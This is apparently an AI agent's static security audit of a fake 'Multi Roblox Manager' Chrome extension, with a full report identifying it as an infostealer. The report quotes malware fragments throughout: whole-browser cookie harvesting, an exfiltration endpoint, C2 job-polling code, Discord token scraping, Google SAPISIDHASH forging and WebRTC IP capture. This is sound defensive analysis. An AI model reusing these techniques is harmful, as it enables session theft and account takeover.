I'll start by mapping the repository structure statically. No execution of any repository content.

Confirmed cookie-harvesting behavior in the service worker. Let me dig into the libraries.

This is far broader than Roblox. Let me beautify the bundles into my scratchpad (a text transform, no execution) for careful reading.

Now let me read the exfiltration core in `shared-sw.js`.

The code literally contains functions named `googleStealerExportKeys` and `buildRobloxStealerCookiesTxt`. Let me read the exfiltration transport.

Now the `_w7k` remote-pull module — this is the command-and-control candidate.

`chrome.cookies.getAll({})` — the entire browser cookie store. Now let me index `shared-core.js`.

There's screenshot capture and a wallet collector. Let me examine those plus the `downloads` permission usage.

Now the main payload assembly in `accounts-manager.js`.

Now let me check the user-facing UI and whether any genuine multi-instance functionality exists.

The advertised core feature is referenced exactly once and **never defined**. Let me verify the fallback path.

I have completed both passes. No repository content was executed — all findings come from reading, grepping, and static text transforms only.

---

# SECURITY AUDIT REPORT — "Multi Roblox Manager" v1.6.0

## Executive Summary

**This extension is a credential- and session-stealing infostealer with a remote-controlled tasking channel. The advertised multi-Roblox functionality does not exist in the code.**

The extension presents itself as a Roblox multi-instance/account manager. Its actual primary behavior, executed automatically without any user interaction, is to:

1. **Harvest every cookie in the browser profile** (`chrome.cookies.getAll({})` — the entire cookie store, all sites), format it as a Netscape `cookies.txt` "stealer log", base64-encode it, and POST it to `https://multiroblox.at/apis/v2/backend/userinfo.php`.
2. **Continuously poll for Roblox `.ROBLOSECURITY` session cookies** every 20 seconds, plus instantly on any cookie change, and exfiltrate them.
3. **Steal Discord authentication tokens** by injecting script into open Discord tabs and scraping `localStorage`/`sessionStorage`.
4. **Steal Google/Microsoft/Yahoo and 20+ other mail-provider session cookies and email addresses**, including DOM-scraping mail pages via script injection.
5. **Harvest session cookies for PayPal, Amazon, Binance, Coinbase, Bybit, Steam, Epic, Battle.net, EA, Riot, Facebook, Instagram, TikTok, X/Twitter, GitHub, Netflix, Spotify** and more.
6. **Screenshot the victim's browser window** and include it in the exfiltration payload.
7. **De-anonymize the victim's real IP via WebRTC STUN**, bypassing VPN/proxy.
8. **Poll a command-and-control endpoint (`pull_poll.php`)** that lets the operator name a specific Roblox account and have the extension locate and re-upload that victim's live session cookie on demand.

The code is not obfuscated. Three of its own functions are literally named **`googleStealerExportKeys`**, **`buildGoogleChromeDefaultStealerTxt`**, and **`buildRobloxStealerCookiesTxt`**. The author's intent is not in question.

**Final classification: Confirmed malicious functionality.** This is not a borderline case.

---

## Extension Architecture

```
manifest.json          MV3, no content_scripts — all injection is programmatic
│
├── background.js      Service worker. The harvest engine + scheduler.
│   ├─ importScripts('lib/shared-core.js', 'lib/shared-sw.js')
│   ├─ _startHarvestPoll()  → every 20s, poll & exfil all Roblox cookies
│   ├─ _startPullPoll()     → C2 job polling loop (_w7k.run)
│   ├─ cookies.onChanged    → instant exfil on .ROBLOSECURITY change
│   └─ onInstalled/onStartup→ full "withExtras" harvest (whole cookie jar)
│
├── lib/shared-sw.js   (52 KB) Service-worker-side stealer library
│   ├─ RbxTxtExport      → builds Netscape cookies.txt "stealer logs"
│   ├─ RbxSwCookieJar    → collectAllProfileCookies() = entire cookie store
│   ├─ MrbxGoogleCookies / MrbxDiscordCookies
│   ├─ MrbxExtrasSW      → collectAndBuildExtrasFields() = payload builder
│   ├─ MrbxSubmit        → postForm / submitMrbxCookie (exfil transport)
│   └─ _w7k              → C2 pull-job client (obfuscated name)
│
├── lib/shared-core.js (87 KB) Shared collectors
│   ├─ RbxEmailDomains / RbxEmailParser  (170-domain email allowlist)
│   ├─ captureScreenshot  (chrome.tabs.captureVisibleTab)
│   ├─ Google/MS/Yahoo/20+ mail cookie + email harvesters
│   ├─ collectYoutubeInfo (channel, subs, revenue-monetization status)
│   └─ RbxExtensionBridge (exported surface)
│
├── scripts/accounts-manager.js (165 KB) Popup logic + second copy of libs
│   ├─ validateCookie()   → assembles the ~50-field exfil payload
│   ├─ RbxGoogle          → SAPISIDHASH forging, OAuthLogin
│   ├─ onLaunch()         → the "multi-Roblox" feature (a stub)
│   └─ cookiesSetRoblosec → account switching (the one real feature)
│
└── popup.html, styles/, icons, theme.css, PACKED.txt, profile.json
```

`shared-sw.js` and `accounts-manager.js` contain largely **duplicate copies** of the same stealer library — one for the service-worker context, one for the popup/page context. A build artifact (`PACKED.txt`: *"Layout: bundled (shared-core + shared-sw + accounts-manager)"*) confirms this is a deliberate packing step.

---

## Permission Analysis

| Permission | Capability granted | Used by | Necessary for stated purpose? | Verdict |
|---|---|---|---|---|
| `cookies` | Read/write/delete any cookie for any site | `background.js:43`, `shared-sw.js:70-72`, `shared-core.js:93-95` | **Read** of `.ROBLOSECURITY` + **write** for account switching: yes. Reading `chrome.cookies.getAll({})` (every site): **no** | **Critically abused** |
| `<all_urls>` host permission | Fetch, inject, and read cookies for **every website** | Cookie harvest, `executeScript` into Gmail/Discord/mail tabs | **No.** Roblox + the vendor's own domain would suffice | **Critically abused** |
| `scripting` | Inject arbitrary JS into any page | 7 `executeScript` call sites — Discord token theft, Google/mail DOM email scraping | **No.** Multi-instance needs no page injection | **Critically abused** |
| `tabs` | Read URL/title of every tab | `enrichFromOpenTabs()` enumerates all open tabs to widen cookie theft; `captureVisibleTab` | **No** | **Critically abused** |
| `activeTab` | Access to the active tab | Screenshot capture | Marginal | Abused |
| `downloads` | Write files to disk | `accounts-manager.js:5685` — downloads a blob from a **server-issued token URL** | Not needed for multi-instance | **Secondary-payload vector** |
| `storage` | Extension-local storage | Harvest dedup state, install ID, cached API key, cookie↔user map | Partly legitimate | Abused (tracks theft state) |
| `alarms` | Periodic wakeups | `mrbx-pull-poll` alarm keeps the **C2 polling loop** alive across SW suspension | **No** | **Persistence mechanism** |

### Host permissions beyond `<all_urls>`

`<all_urls>` already grants everything, so the ~60 additional explicit host permissions are **redundant** — they exist to guarantee access survives if `<all_urls>` were stripped, and they reveal targeting intent:

- **Discord** (`discord.com`, `discordapp.com`, ptb/canary) — token theft
- **Google** (`accounts.`, `myaccount.`, `mail.`, `googleusercontent.com`) — session theft
- **Microsoft** (`login.live.com`, `login.microsoftonline.com`, `outlook.*`, `*.cloud.microsoft`, `office365`) — session theft
- **YouTube** — channel value/monetization assessment
- **`http://127.0.0.1:3000-3010` and `localhost:3000-3010`** — a **local development/staging backend**, indicating in-house tooling
- **`multiroblox.at`, `rbxmodes.pro`, `rocustomize.pro`** — the operator's infrastructure; the presence of **three sibling lure domains** indicates a multi-brand campaign
- **`roblox.com`** — the only genuinely justified entry

**There are no `web_accessible_resources`, no `content_scripts`, and no `externally_connectable` declarations.** All injection is programmatic via `chrome.scripting`, which avoids declaring targets in the manifest — a review-evasion characteristic.

---

## Network Analysis

| Destination | File | Trigger | Data sent | Necessary? |
|---|---|---|---|---|
| `https://multiroblox.at/apis/v2/backend/ext-key.php` | `shared-sw.js:162` | SW start, cookie change | ext version, install UUID, `pass` | No — auth for the exfil API |
| `.../backend/userinfo.php` | `shared-sw.js:192` | Every harvest cycle | **`.ROBLOSECURITY`, full browser cookie jar (b64), Google/mail cookies (b64), Discord token, emails, worker dir, install ID** | **No — this is the exfil sink** |
| `.../backend/check.php` | `shared-sw.js`, C2 path | Cookie validation | `.ROBLOSECURITY` | No |
| `.../backend/pull_poll.php` | `shared-sw.js:224` | Every 5–60 s, forever | Logged-in Roblox userids/usernames; **receives operator jobs** | **No — C2 channel** |
| `https://multiroblox.at/api/validate-cookie` | `accounts-manager.js` | Popup "Start" action | The full ~50-field payload incl. **screenshot, walletSnapshot, `_realIp`, bearerTokens, 40+ site auth objects** | **No** |
| `https://multiroblox.at/api/check-account`, `/api/resolve-item`, `/api/local-ping` | `accounts-manager.js` | UI actions | cookie, userId | No |
| `http://127.0.0.1:3000-3010/...` | `accounts-manager.js` | If `MRBX_USE_LOCAL_API`/`MRBX_PROBE_LOCAL_FIRST` set | Same payloads | No — dev backend |
| `https://accounts.google.com/ListAccounts?...&source=ChromiumBrowser` | `shared-core.js` | Email harvest | Victim's Google cookies (`credentials:'include'`) | **No** |
| `https://myaccount.google.com/embedded/account/v1/details`, `/profile/name/get` | `shared-core.js` | Email harvest | Victim's Google cookies | **No** |
| `https://www.google.com/accounts/OAuthLogin` | `accounts-manager.js:79` | Google auth validation | Forged `Cookie` header from stolen SAPISID | **No** |
| `https://studio.youtube.com/youtubei/v1/analytics/query`, `youtube.com/youtubei/v1/browse` | `shared-core.js` | YouTube profiling | Victim's YouTube session | **No** |
| `https://discord.com/api/v10/users/@me` | `accounts-manager.js` | Token validation | **Stolen Discord token** | **No** |
| `stun:stun.l.google.com:19302` | `accounts-manager.js:428` | Payload build | WebRTC ICE — **harvests real public IP** | **No — VPN bypass** |
| `users.roblox.com`, `presence.roblox.com`, `thumbnails.roblox.com`, `games.roblox.com` | `accounts-manager.js` | UI rendering | Standard Roblox API use | **Yes — legitimate** |

No Discord webhooks, paste sites, URL shorteners, or WebSockets were found. All exfiltration is consolidated to the operator's own PHP backend.

---

## Data-Flow Analysis

### Flow 1 — Full browser cookie jar (Critical)

```
chrome.cookies.getAll({})                      ← shared-sw.js:70-72, shared-core.js:93-95
  + getAll per Google/MS/Yahoo/mail domain
  + getAll per PayPal/Amazon/Binance/Coinbase/Bybit/Steam/Epic/... domain
  + getAll for every domain of every OPEN TAB   ← enrichFromOpenTabs(), 140-domain cap
        ↓
createCookieJarBuilder() → dedup → jarMetaToString()
        ↓
RbxTxtExport.buildFullBrowserNetscapeTxt(body)  → Netscape "# Netscape HTTP Cookie File" format
        ↓
b64Utf8()  →  field `txt_all_b64`  (cap 600 KB raw / 800 KB b64)
        ↓
POST https://multiroblox.at/apis/v2/backend/userinfo.php
```

This is a complete, importable session-hijacking package for **every site the victim is logged into**. The Netscape `cookies.txt` format is the standard interchange format for infostealer logs.

### Flow 2 — Roblox session cookie (Critical)

```
chrome.cookies.get / getAll('.roblox.com', '.ROBLOSECURITY')
        ↓
cleanRobloxCookie() — strips Roblox's own security warning banner:
    "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-
     as-you-and-to-steal-your-ROBUX-and-items.|_"
        ↓
submitMrbxCookie() → POST userinfo.php  (field `cookie`)
```

**The extension explicitly strips Roblox's anti-theft warning** (`shared-sw.js`, `cleanRobloxCookie`) before transmitting. This regex exists solely to normalize a stolen credential for reuse.

Triggers: on install, on browser startup, **every 20 seconds**, on **any** `.ROBLOSECURITY` cookie change (1.5 s debounce), and on operator command.

### Flow 3 — Discord token (Critical)

```
chrome.tabs.query({url:['https://discord.com/*', ...]})
        ↓  (falls back to scanning ALL tabs for discord URLs)
chrome.scripting.executeScript({func: readDiscordTokenInPage})   ← shared-sw.js:102
        ↓  scans localStorage + sessionStorage for JWT-shaped
           and `mfa.*` token patterns
        ↓
body.discordToken → validated against discord.com/api/v10/users/@me
        ↓
field `txt_discord_b64` + `discord_token`  →  userinfo.php
```

### Flow 4 — Google account takeover primitives (Critical)

Harvests the full Google auth cookie set — `__Secure-1PSID`, `__Secure-3PSID`, `__Secure-1PAPISID`, `SID`, `HSID`, `SSID`, `APISID`, `SAPISID`, `LSID`, `__Host-GAPS`, `__Secure-1PSIDTS` — the exact set required to restore a Google session on attacker hardware. Additionally implements **`generateSAPISIDHash()`** (`accounts-manager.js:83`), which forges the `SAPISIDHASH <ts>_<sha1>` header Google's internal APIs require — letting the operator authenticate as the victim.

### Flow 5 — 40+ third-party site auth objects (Critical)

`extractPlatformAuthFromJar()` splits the stolen jar into named per-service auth bundles, all attached to the payload:

`paypalAuth`, `amazonAuth`, `binanceAuth`, `coinbaseAuth`, `bybitAuth`, `steamAuth`, `epicAuth`, `twitchAuth`, `telegramAuth`, `vkAuth`, `facebookAuth`, `instagramAuth`, `twitterAuth`, `tiktokAuth`, `linkedinAuth`, `blizzardAuth`, `eaAuth`, `riotAuth`, `minecraftAuth`, plus 22 mail-provider auth objects (`yahooAuth`, `protonAuth`, `icloudAuth`, `yandexAuth`, `mailRuAuth`, `qqAuth`, …).

This has **no conceivable relationship to running two copies of Roblox.**

### Flow 6 — Screenshot, real IP, bearer tokens, wallet slot

- `attachScreenshotToBody()` → `chrome.tabs.captureVisibleTab` → `body.screenshot` (up to 600 KB b64)
- WebRTC `RTCPeerConnection` + STUN → filters out RFC1918 ranges → `body._realIp` (**VPN de-anonymization**)
- `chrome.runtime.sendMessage({type:'rbx-get-bearer-tokens'})` → `body.bearerTokens` *(note: no handler for this message type exists in this build — see Limitations)*
- `body.walletSnapshot = {text, entries, mnemonics}` with `trimWalletSnapshot()` capping **12 mnemonics at 500 chars each** — a **crypto seed-phrase exfiltration slot**

---

## Backdoor / Malware Analysis

### Confirmed remote-command channel: `_w7k` / `pull_poll.php`

`lib/shared-sw.js:224`. The deliberately meaningless names (`_w7k`, `_ck`, `_fk`, `_mem`, `mrbx_x7k2`) are the only naming-level concealment in the codebase.

**Operation:**

1. The extension maintains `mrbx_x7k2` in `chrome.storage.local` — a persistent map of *userid → username → cookie fingerprint* for every Roblox account ever seen in this browser.
2. Every 5–60 seconds it POSTs that roster to `pull_poll.php`:
   ```js
   pollFields.mrbx_poll_sessions = JSON.stringify(sessions);
   poll = await api.postForm('pull_poll.php', pollFields, {noHarvest:true});
   ```
3. The server replies with a job list and a server-chosen poll interval:
   ```js
   var job = poll.data.pulls[0];
   var target = String(job.username).trim();
   ```
4. `_resolve(target)` locates that specific victim's live `.ROBLOSECURITY` cookie in the browser (verifying identity via `check.php`), and re-uploads it with full extras, tagged `pass:'Pulled'` and `mrbx_pull_id`.
5. A `'*'` wildcard target returns whatever cookie is available.

**This is on-demand, operator-directed session theft.** The attacker browses a dashboard of compromised accounts and clicks to pull a fresh, live session for any chosen victim. `chrome.alarms` (`mrbx-pull-poll`) keeps the loop alive across service-worker suspension — **unauthorized persistence**.

### Server-controlled behavior

The server can:
- **Set polling cadence** (`next_poll_ms`) — throttle to evade detection
- **Kill-switch the client** via HTTP `426` → sets `MRBX_EXTENSION_OUTDATED`, pausing harvest (`_pauseHarvestOutdated`) — useful for silencing a version under analysis
- **Direct which victim to steal from** (`pulls[].username`)
- **Issue arbitrary download tokens** → `RbxApi.downloadUrl(token)` → `chrome.downloads.download()` writes a server-supplied blob to disk with `saveAs:false` (**no user prompt**)

### Secondary payload capability

`triggerDownload()` (`accounts-manager.js:5685`) fetches a file from a **server-issued token URL** and writes it to the victim's Downloads folder silently. Combined with the "download" `profile.json` mode and the "Followers Bot" lure in the UI, this is a viable second-stage delivery path. Note: the extension cannot *execute* the downloaded file — but a Roblox-focused audience being handed an "exe" is a well-established social-engineering chain.

### Anti-analysis / evasion

- **Rate-limiting the theft itself** — `_UNIQUE_INTERVAL_MS` (20 s), `_DUPLICATE_INTERVAL_MS` (1000 s), `_MAX_DUP_SUBMISSIONS` (3), `exhausted` flags. This minimizes network noise so the exfiltration blends into normal traffic.
- **Spoofed `User-Agent`** header on every exfil POST: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/134.0.0.0` (`postForm`) — makes server-side logs look like ordinary browser traffic.
- **Harvest state reset on version change** — re-steals everything after each update.
- **`{noHarvest:true}`** on C2 polls — suppresses the `mrbx_harvest=1` flag so beacon traffic is distinguishable server-side from theft traffic.

---

## Code Execution / System Access

| Vector | Present? | Evidence |
|---|---|---|
| `eval` / `new Function` | **No** | Grepped across all JS — zero matches |
| Dynamic `import()` | **No** | Zero matches |
| Remote script loading | **No** | No `createElement('script')`, no remote `<script src>`; CSP-compliant MV3 |
| WebAssembly | **No** | Zero matches |
| **`nativeMessaging`** | **No** | Not in manifest; no `connectNative` calls |
| Native binaries (`.exe`/`.dll`/`.sys`) | **No** | Only 4 PNG icons; all terminate exactly at `IEND` with **zero trailing bytes** |
| Shell / PowerShell / registry | **No** | Not reachable from an MV3 extension; no artifacts found |
| **Script injection into arbitrary pages** | **Yes** | 7 × `chrome.scripting.executeScript` — but all inject *statically-defined functions* (`func:`), not server-supplied strings |
| **Silent file write to disk** | **Yes** | `chrome.downloads.download({saveAs:false})` from server-issued token URL |
| **Persistence** | **Yes** | `chrome.alarms` + `onStartup` + `onInstalled` keep the C2 loop alive indefinitely |

**Important distinction:** the extension has **no arbitrary-code-execution primitive**. Every injected function is hardcoded in the bundle. The remote control is over *data and tasking*, not *code*. This bounds the damage: a server compromise could redirect the theft, not run new code — unless a new extension version is pushed, or the download vector is used for a second stage.

There is no native component to analyze. Nothing in the extension can spawn a process, touch the registry, or read the filesystem.

---

## Obfuscation Analysis

**This code is minified, not obfuscated.** There is no packing, no string-array encoding, no control-flow flattening, no anti-debugging, no sandbox detection, no environment checks.

| Technique | Assessment |
|---|---|
| Whitespace-stripped, long lines | **Ordinary minification** — a build step (`PACKED.txt`) |
| `b64Utf8()` / `btoa` on payload fields | **Transport encoding**, not concealment — trivially reversible, and standard for shipping multi-line text through form-urlencoded POST |
| `_w7k`, `_ck`, `_fk`, `mrbx_x7k2`, `q7n2k8wp.js` | **Deliberate semantic concealment** — meaningless identifiers on precisely the C2 module and its storage key, while every other module has a descriptive name. Targeted, not systemic. |
| `atob`/`fromCharCode` | Used for gzip/jar handling and image data — benign |
| Long base64 literals | **None found** — no embedded payloads |

Notably, the author *did not* rename the most incriminating functions: `googleStealerExportKeys`, `buildGoogleChromeDefaultStealerTxt`, `buildRobloxStealerCookiesTxt`, `collectAndBuildExtrasFields`, `_pollAllRobloxCookies`, `_backgroundHarvest`. Console logs read `'[MRBX harvest poll]'`. The concealment effort was minimal and inconsistent — consistent with a commodity tool never intended to pass Chrome Web Store review (and indeed distributed outside it).

---

## Dependency / Supply-Chain Analysis

**No `package.json`, no lockfile, no `node_modules`, no CDN references, no vendored third-party libraries, no install/postinstall scripts, no GitHub Actions or CI configuration, no build scripts.**

All code is first-party and self-contained. There is **no supply-chain risk** here — and no supply-chain excuse. Every malicious line was written by the extension's author.

`PACKED.txt` documents an internal packer:
```
Multi Roblox Manager pack
Manifest version: 1.6.0
Packed UTC 2026-09-19 20:38:31
Output zip: Multi Roblox Account.zip
Layout: bundled (shared-core + shared-sw + accounts-manager)
```
The packer itself is not in the repository.

`profile.json` reveals campaign metadata:
```json
{"slug":"multi-roblox-manager","kind":"download","mode":"game",
 "tool":"multiple-roblox","displayTitle":"Multi Roblox Manager"}
```
A `slug`/`tool` schema implies a **templated builder producing multiple branded variants** — corroborated by the `rbxmodes.pro` and `rocustomize.pro` host permissions and the `rbxlabs-mark.svg` asset name (a fourth, unused brand).

---

## Git History Findings

Three commits, all authored 2026-09-20 by the repository owner (the person requesting this audit), consistent with uploading a sample for analysis:

| Commit | Change |
|---|---|
| `e4cb96c` | `Initial commit` — README only |
| `ec3d8ed` | `Add files via upload` — added `Multi-Roblox-Accounts.zip` (92,377 bytes) |
| `d175c36` | `Added the files to repo` — unzipped contents committed, zip deleted |

I extracted the historical zip's **file listing** (no code executed, no files run). All 16 entries match the working-tree files byte-for-byte in size. **Nothing was removed, hidden, or altered between the archive and the checked-in tree.**

The zip's internal timestamps are `2026-09-20 00:38`, matching `PACKED.txt`'s `2026-09-19 20:38:31 UTC` — an internally consistent +4h offset, with one exception: `assets/rbxlabs-mark.svg` dated `2026-06-17`, indicating the branding asset predates this build by three months.

**No malicious history was found** — there is no upstream history here to examine. The extension's own development history is not in this repository, so *static analysis cannot establish* how these capabilities evolved.

---

## Roblox Functionality Analysis

This is the decisive section.

### How multi-instance Roblox actually works

Running multiple Roblox clients on Windows requires defeating `ROBLOX_singletonMutex` — a named kernel mutex. The standard approaches are (a) a native helper that opens and holds the mutex handle, (b) a patched client, or (c) OS-level sandboxing. **All require native code. A Chrome extension is architecturally incapable of any of them.**

### What this extension actually implements

**The "Launch all" button does nothing.** `accounts-manager.js:691`:

```js
function onLaunch(){
  var run = g.__mrmRunMultipleRobloxLikeStart;
  if (typeof run === 'function') { ...run()... return; }
  chrome.tabs.create({url: ROBLOX_HOME});     // ← the actual behavior
}
```

I searched every file in the extension. **`__mrmRunMultipleRobloxLikeStart` appears exactly once — at this reference. It is never defined anywhere.** The conditional is permanently false. Clicking "Launch all" or "Launch selected" opens `https://www.roblox.com/home` in a tab. That is the entirety of the advertised feature.

Similarly, `RbxWalletCollector` and `RbxApi` are referenced but never defined in this build — the same stub pattern.

### What *is* implemented

One genuine feature exists: **account switching** via `cookiesSetRoblosec()` — writing a stored `.ROBLOSECURITY` value back into the cookie jar. This is real, and it *is* why the `cookies` permission has a legitimate read/write claim. But it is **sequential account switching, not concurrent instances**, and it requires only:

- `cookies` permission
- host permission for `roblox.com`

### Capability-by-capability necessity test

| Capability | Needed for multi-instance / account switching? |
|---|---|
| Read/write `.ROBLOSECURITY` on roblox.com | **Yes** |
| Roblox API calls (users, presence, thumbnails) | **Yes** — populates the account list UI |
| `chrome.cookies.getAll({})` — whole cookie store | **No** |
| Google/Microsoft/Yahoo/22 mail-provider cookies | **No** |
| PayPal/Amazon/Binance/Coinbase/Bybit cookies | **No** |
| Discord token extraction via script injection | **No** |
| Email address harvesting (170-domain allowlist) | **No** |
| Browser screenshot | **No** |
| WebRTC real-IP de-anonymization | **No** |
| YouTube channel/monetization profiling | **No** |
| SAPISIDHASH forging | **No** |
| 20-second automatic background polling | **No** |
| Remote job-pull C2 loop | **No** |
| Silent file download | **No** |
| Crypto seed-phrase (`mnemonics`) payload slot | **No** |

**The advertised feature is absent; the unrelated capability is the entire product.** The Roblox UI is the lure.

---

## Detailed Findings

### F-1 — Automatic whole-browser cookie exfiltration
- **File:** `lib/shared-sw.js:70-72` (`collectAllProfileCookies`), `lib/shared-core.js:93-95`
- **Function:** `collectAllProfileCookies()` → `buildFullBrowserNetscapeTxt()` → `putB64('txt_all_b64', ...)`
- **Observed:** `builder.addBatch(await chrome.cookies.getAll({}));` — unfiltered retrieval of every cookie in the profile, plus targeted sweeps of Google, Microsoft, 22 mail providers, and 40+ commerce/gaming/crypto domains, plus every domain of every open tab.
- **Data accessed:** All session cookies for all sites the victim is logged into.
- **Destination:** `POST https://multiroblox.at/apis/v2/backend/userinfo.php`, field `txt_all_b64`.
- **Trigger:** Automatic on install, on browser startup, and on `.ROBLOSECURITY` change. **No user interaction.**
- **Relation to stated purpose:** None.
- **Impact:** Complete account takeover across the victim's entire web footprint — email, banking, crypto exchanges, social media, code hosting.
- **Severity: Critical · Confidence: High**

### F-2 — Remote-controlled session-pull backdoor
- **File:** `lib/shared-sw.js:224`
- **Function:** `_w7k.run()` / `_resolve()` / `_fk()`
- **Observed:** `poll = await api.postForm('pull_poll.php', pollFields, {noHarvest:true});` then `var job = poll.data.pulls[0]; var target = String(job.username).trim();` → locates that named victim's live cookie → re-uploads.
- **Data accessed:** Roster of all Roblox accounts seen in the browser; on command, any one's live session cookie.
- **Destination:** `pull_poll.php` (inbound tasking) → `userinfo.php` (outbound theft).
- **Trigger:** Autonomous 5–60 s loop, kept alive by `chrome.alarms`.
- **Impact:** Operator-directed, on-demand account takeover with fresh sessions; server controls cadence and can kill-switch the client via HTTP 426.
- **Severity: Critical · Confidence: High**

### F-3 — Roblox anti-theft warning stripping
- **File:** `lib/shared-sw.js` (`cleanRobloxCookie`), duplicated in `scripts/accounts-manager.js`
- **Observed:**
  ```js
  cookie = cookie.replace(/_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-
    someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_/gi, '');
  ```
- **Impact:** Normalizes the stolen credential into directly reusable form. This regex has no legitimate purpose; Roblox embeds the warning specifically to make theft obvious.
- **Severity: Critical · Confidence: High** — strong standalone evidence of intent.

### F-4 — Discord token theft via script injection
- **File:** `lib/shared-sw.js:102` (`collectDiscordTokenSW`, `readDiscordTokenInPage`)
- **Observed:** `chrome.scripting.executeScript({target:{tabId}, func: readDiscordTokenInPage})` — scans `localStorage` and `sessionStorage` for JWT-shaped and `mfa.*` tokens. Falls back to scanning **all** tabs if pattern-matching finds none.
- **Destination:** `txt_discord_b64` + `discord_token` → `userinfo.php`; validated against `discord.com/api/v10/users/@me`.
- **Impact:** Full Discord account takeover, bypassing 2FA (a session token is post-authentication).
- **Severity: Critical · Confidence: High**

### F-5 — Google session theft + SAPISIDHASH forging
- **File:** `scripts/accounts-manager.js:79, 83` · `lib/shared-sw.js:9-10`
- **Functions:** `googleStealerExportKeys()`, `buildGoogleChromeDefaultStealerTxt()`, `generateSAPISIDHash()`, `validateGoogleAuth()`
- **Observed:** Harvests `__Secure-1PSID`/`3PSID`/`1PAPISID`/`SID`/`HSID`/`SSID`/`APISID`/`SAPISID`/`LSID`/`__Host-GAPS`/`__Secure-1PSIDTS`; forges `SAPISIDHASH ${ts}_${sha1}`; calls `accounts.google.com/ListAccounts?...source=ChromiumBrowser` and `myaccount.google.com/embedded/account/v1/details` with the victim's credentials.
- **Impact:** Google account takeover including Gmail — the root of most password-reset chains.
- **Severity: Critical · Confidence: High**

### F-6 — Silent secondary-payload download
- **File:** `scripts/accounts-manager.js:5685` (`triggerDownload`)
- **Observed:** `chrome.downloads.download({url: blobUrl, filename: safeName, saveAs: false})` where the blob comes from `RbxApi.downloadUrl(token)` — a **server-issued token URL**.
- **Impact:** Operator can silently place arbitrary files in the victim's Downloads folder. The extension cannot execute them, but this is a standard second-stage delivery step for a gaming-focused audience.
- **Severity: High · Confidence: Medium** (capability confirmed; `RbxApi` is not defined in this build — see Limitations)

### F-7 — WebRTC real-IP de-anonymization
- **File:** `scripts/accounts-manager.js:428`
- **Observed:** `new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]})`, filters out `192.168.*`, `10.*`, `172.*`, `0.0.0.0`, keeps the public IP as `body._realIp`.
- **Impact:** Defeats VPN/proxy; enables geolocation, correlation, and targeted follow-on attacks. The field name `_realIp` states the intent.
- **Severity: High · Confidence: High**

### F-8 — Browser screenshot capture
- **File:** `lib/shared-core.js:74` (`captureScreenshot`), `scripts/accounts-manager.js` (`attachScreenshotToBody`)
- **Observed:** `chrome.tabs.captureVisibleTab({format:'png'})`, up to 600 KB base64 in `body.screenshot`. Preferentially targets the window containing a Roblox tab, falling back to the last-focused window — so it can capture **any** page.
- **Impact:** Surveillance; may capture inventory, balances, private messages, or credentials on screen.
- **Severity: High · Confidence: High**

### F-9 — Crypto wallet seed-phrase exfiltration slot
- **File:** `scripts/accounts-manager.js:107, 420, 520`
- **Observed:** `body.walletSnapshot = {text, entries, mnemonics}`; `trimWalletSnapshot()` caps `mnemonics` at **12 entries × 500 chars** and `entries` at 24 × 12,000 chars.
- **Relation to purpose:** None whatsoever.
- **Impact:** If the collector module is supplied, irreversible theft of crypto wallets.
- **Severity: High · Confidence: Medium** — the payload schema, size limits, and dispatch code are **confirmed present**; the `RbxWalletCollector` module is **absent from this build**, so it is inert here. The server-side schema clearly expects it.

### F-10 — Mass email-address harvesting
- **File:** `lib/shared-core.js` — `RbxEmailDomains` (170-domain allowlist), `getAllMailEmails()`, `MAIL_PROVIDER_SELECTORS` (20 providers with CSS selectors)
- **Observed:** Injects `universalExtractor` into open mail tabs; scrapes `LSID`/`ACCOUNT_CHOOSER` cookies; parses `ListAccounts` responses; scores candidates and filters `noreply@`-style noise to isolate **real user addresses**.
- **Destination:** `txt_emails_b64`, `mail_emails_json`, `googleEmail`, `outlookEmail`, `yahooEmail`, `mailByProvider`.
- **Impact:** Builds a victim identity profile for credential stuffing, phishing, and resale.
- **Severity: High · Confidence: High**

### F-11 — YouTube channel monetization profiling
- **File:** `lib/shared-core.js` (`collectYoutubeInfo`)
- **Observed:** Queries `studio.youtube.com/youtubei/v1/analytics/query` and `youtube.com/youtubei/v1/browse` with the victim's session; collects `channelId`, `subscribers`, `totalViews`, `totalLikes`, and **`monetized` / `monetizationStatus`**.
- **Impact:** **Victim value assessment** — identifies monetized creator accounts worth hijacking. A hallmark of organized infostealer operations, not of a game utility.
- **Severity: Medium · Confidence: High**

### F-12 — Permanent background persistence
- **File:** `background.js:39-43`
- **Observed:** Top-level `_seedWorkerDir(); _startPullPoll(); _startHarvestPoll();` plus `onInstalled`, `onStartup`, `cookies.onChanged`, and a `chrome.alarms` (`mrbx-pull-poll`) periodic wake to survive MV3 service-worker suspension.
- **Impact:** Theft and C2 run for the entire lifetime of the installation, with no UI indication.
- **Severity: High · Confidence: High**

### F-13 — Non-functional advertised feature
- **File:** `scripts/accounts-manager.js:691`
- **Observed:** `__mrmRunMultipleRobloxLikeStart` referenced once, defined nowhere; fallback is `chrome.tabs.create({url: ROBLOX_HOME})`.
- **Impact:** Confirms the stated purpose is pretextual. Materially strengthens every finding above: there is no legitimate function against which to weigh the privileged access.
- **Severity: High (as evidence) · Confidence: High**

### F-14 — Evasion: spoofed User-Agent and self-throttling
- **File:** `lib/shared-sw.js` (`postForm`), `background.js:1-27`
- **Observed:** Hardcoded `'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)... Chrome/134.0.0.0 Safari/537.36'` on exfil POSTs; `_UNIQUE_INTERVAL_MS`/`_DUPLICATE_INTERVAL_MS`/`_MAX_DUP_SUBMISSIONS`/`exhausted` throttling; HTTP-426 kill-switch.
- **Impact:** Reduces network-detection surface and lets the operator silence clients under analysis.
- **Severity: Medium · Confidence: High**

---

## False Positives / Benign Findings

I specifically examined these and found **legitimate or non-malicious** explanations:

- **`chrome.cookies` permission per se** — genuinely required for the real account-switching feature (`cookiesSetRoblosec`). The permission is not the problem; `getAll({})` is.
- **Roblox API calls** (`users.roblox.com/v1/users/authenticated`, `presence.roblox.com/v1/presence/users`, `thumbnails.roblox.com/*`, `games.roblox.com/v1/games`) — ordinary public/authenticated API use to render the account list, online status, and avatars. Normal.
- **`curl.se/docs/http-cookies.html`** — appears only as the standard header comment line in Netscape cookie-file format. Not a network call; no contact with curl.se.
